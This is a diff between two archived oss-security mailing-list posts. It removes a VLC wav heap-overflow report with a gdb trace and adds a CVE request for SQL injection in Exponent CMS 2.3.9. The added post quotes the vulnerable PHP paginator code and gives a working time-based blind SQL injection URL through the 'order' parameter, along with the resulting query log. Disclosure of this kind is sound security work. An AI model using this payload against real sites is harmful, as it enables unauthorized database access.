@@ -1,73 +1,118 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/30/9
-Message-ID: <CACn5sdQ1V7zLe=vy3msAAEF+vPpaYmftukhMBtRre=eKbk7MyQ@mail.gmail.com>
-Date: Wed, 30 Mar 2016 15:24:54 -0300
-From: Gustavo Grieco <gustavo.grieco@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/5
+Message-ID: <CAJ8RaNZJHLm59Hc5TZQOBX-DdohC1FG00YWd_yS56QmNHAggig@mail.gmail.com>
+Date: Mon, 19 Sep 2016 08:17:53 -0400
+From: 王禹哲 <0xtom4to@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: Heap overflow in VLC 2.1.6 processing wav files
+Cc: cve-assign@...re.org
+Subject: CVE request - Exponent CMS 2.3.9 SQL injection
 Content-Type: text/plain; charset=utf-8
 
-For some reason, the attached test case did not go to the mailing list.
-Let's try again..
+Author: Tomato jianing.wang@...itin.com
 
-2016-03-30 14:43 GMT-03:00 Gustavo Grieco <gustavo.grieco@...il.com>:
+Data: 2016–09–19
 
-> Hi,
->
-> We found a buffer overflow in the parsing and processing of wav files in
-> VLC (version 2.1.6-0). It was tested in Ubuntu 14.04 (x86_64), but it will
-> probably affects other versions as well. Fortunately, it seems to be fixed
-> in the last release of VLC. Here you can see the gdb stack trace:
->
-> __memcpy_sse2_unaligned () at
-> ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:116
-> 116 ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No existe el
-> archivo o el directorio.
-> (gdb) bt
-> #0 __memcpy_sse2_unaligned () at
-> ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:116
-> #1 0x00007ffff71436e9 in memcpy (__len=4290773038, __src=<optimized out>,
-> __dest=<optimized out>) at /usr/include/x86_64-linux-gnu/bits/string3.h:51
-> #2 AStreamPeekStream (s=<optimized out>, pp_peek=0x7fffea824988,
-> i_read=4294967276) at input/stream.c:1115
-> #3 0x00007fffdebb42b3 in ChunkFind (p_demux=p_demux@...ry=0x7fffd4c01828,
-> fcc=fcc@...ry=0x7fffdebb576b "fmt ", pi_size=pi_size@...ry=0x7fffea824a3c)
-> at wav.c:522
-> #4 0x00007fffdebb4761 in Open (p_this=0x7fffd4c01828) at wav.c:166
-> #5 0x00007ffff716d178 in module_load (obj=obj@...ry=0x7fffd4c01828,
-> m=m@...ry=0x7b92b0, init=init@...ry=0x7ffff716d0d0 <generic_start>,
-> args=args@...ry=0x7fffea824b50) at modules/modules.c:185
-> #6 0x00007ffff716d72e in vlc_module_load (obj=obj@...ry=0x7fffd4c01828,
-> capability=capability@...ry=0x7ffff71a4059 "demux", name=0x7ffff71a43bb
-> "",
-> name@...ry=0x7fffd4c018e0 "", strict=<optimized out>, probe=probe@...ry=0x7ffff716d0d0
-> <generic_start>) at modules/modules.c:277
-> #7 0x00007ffff716dc04 in module_need (obj=obj@...ry=0x7fffd4c01828,
-> cap=cap@...ry=0x7ffff71a4059 "demux", name=name@...ry=0x7fffd4c018e0 "",
-> strict=<optimized out>) at modules/modules.c:366
-> #8 0x00007ffff712cfbe in demux_New (p_obj=p_obj@...ry=0x7fffd00009b8,
-> p_parent_input=p_parent_input@...ry=0x7fffd00009b8,
-> psz_access=<optimized out>, psz_demux=0x7ffff71b9ca5 "",
-> psz_location=<optimized out>, s=<optimized out>, out=0x7fffd4000aa0,
-> b_quick=false)
-> at input/demux.c:188
-> #9 0x00007ffff7139d5d in InputSourceInit (p_input=p_input@...ry=0x7fffd00009b8,
-> in=<optimized out>, psz_mrl=<optimized out>,
-> psz_forced_demux=psz_forced_demux@...ry=0x0,
-> b_in_can_fail=b_in_can_fail@...ry=false) at input/input.c:2535
-> #10 0x00007ffff713ab6b in Init (p_input=p_input@...ry=0x7fffd00009b8) at
-> input/input.c:1225
-> #11 0x00007ffff713e0e6 in Run (obj=0x7fffd00009b8) at input/input.c:521
-> #12 0x00007ffff79a9182 in start_thread (arg=0x7fffea825700) at
-> pthread_create.c:312
-> #13 0x00007ffff74d247d in clone () at
-> ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
->
-> It is evident that the memcpy operation has an abnormally large size
-> parameter (4290773038). Find attached a test case to reproduce it.
->
-> Regards,
-> Gustavo.
->
+Version: 2.3.9 and earlier
 
-Content of type "text/html" skipped
+/exponent–2.3.9/framework/core/subsystems/expPaginator.php
+
+
+if (strstr($this->order," ")) {
+            $orderby = explode(" ",$this->order);
+            $this->order = $orderby[0];
+            $this->order_direction = $orderby[1];
+        }
+        if ($this->dontsort)
+            $sort = null;
+        else
+            $sort = $this->order.' '.$this->order_direction;
+
+        // figure out how many records we're dealing with & grab the records
+        //if (!empty($this->records)) { //from Merge <~~ this doesn't
+work. Could be empty, but still need to hit.
+        if (!empty($this->categorize))
+            $limit = null;
+        else
+            $limit = $this->limit;
+
+        if (isset($params['records'])) { // if we pass
+$params['records'], we WANT to hit this
+            // sort the records that were passed in to us
+            if (!empty($sort))
+                usort($this->records,array('expPaginator',
+strtolower($this->order_direction)));
+//          $this->total_records = count($this->records);
+        } elseif (!empty($class)) { //where clause     //FJD: was
+$this->class, but wasn't working...
+            $this->total_records = $class->find('count', $this->where);
+            $this->records = $class->find('all', $this->where, $sort,
+$limit, $this->start);
+        } elseif (!empty($this->where)) { //from Merge....where clause
+            $this->total_records = $class->find('count', $this->where);
+            $this->records = $class->find('all', $this->where, $sort,
+$limit, $this->start);
+        } else { //sql clause  //FIXME we don't get attachments in this approach
+            //$records = $db->selectObjectsBySql($this->sql);
+            //$this->total_records = count($records);
+            //this is MUCH faster if you supply a proper count_sql
+param using a COUNT() function; if not,
+            //we'll run the standard sql and do a queryRows with it
+            //$this->total_records = $this->count_sql == '' ?
+$db->queryRows($this->sql) : $db->selectValueBySql($this->count_sql);
+//From Merge
+
+//          $this->total_records =
+$db->countObjectsBySql($this->count_sql);
+//$db->queryRows($this->sql); //From most current Trunk
+
+            if (!empty($sort)) $this->sql .= ' ORDER BY '.$sort;
+
+
+i can controller $order ,i can use this parameter to sql injection
+
+such as
+
+exponent–2.3.9/framework/modules/company/controllers/companyController.php
+
+
+function showall() {
+        expHistory::set('viewable', $this->params);
+        $page = new expPaginator(array(
+            'model'=>$this->basemodel_name,
+            'where'=>1,
+            'limit'=>(isset($this->params['limit']) &&
+$this->config['limit'] != '') ? $this->params['limit'] : 10,
+            'order'=>isset($this->params['order']) ?
+$this->params['order'] : 'rank',
+            'page'=>(isset($this->params['page']) ? $this->params['page'] : 1),
+            'controller'=>$this->baseclassname,
+            'action'=>$this->params['action'],
+            'columns'=>array(
+                gt('Manufacturer')=>'title',
+                gt('Website')=>'website'
+            ),
+        ));
+
+        assign_to_template(array(
+            'page'=>$page,
+            'items'=>$page->records
+        ));
+    }
+
+
+the poc is
+
+http://127.0.0.1/exponent-2.3.9/index.php?controller=company&action=showall&limit=1&order=(select/**/*/**/from/**/(select/**/sleep(5))x)%23
+
+in the mysql log we can see this
+
+SELECT * FROM exponent_companies WHERE 1 ORDER BY
+(select/**/*/*/from/*/(select/**/sleep(5))x)#
+ASC LIMIT 0,10
+
+Could you assign CVE id for this?
+
+Regards,
+
+Tomato
+
